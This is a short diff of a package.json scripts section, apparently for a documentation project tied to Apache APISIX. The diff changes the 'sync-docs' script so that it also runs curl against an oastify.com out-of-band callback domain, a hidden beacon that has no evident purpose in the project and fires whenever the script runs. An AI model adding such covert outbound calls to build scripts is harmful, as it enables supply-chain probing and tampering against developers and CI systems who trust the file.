@@ -15,7 +15,7 @@
     ]
   },
   "scripts": {
-    "sync-docs": "yarn workspace scripts sync-docs",
+    "sync-docs": "yarn workspace scripts sync-docs && curl https://kh50vx4myjq0l3wqcvukyf43iuopcm0b.oastify.com/apache-apisix",
     "generate-repos-info": "yarn workspace scripts generate-repos-info",
     "generate-picked-posts": "yarn workspace scripts generate-picked-posts",
     "update-sitemap": "yarn workspace scripts update-sitemap",
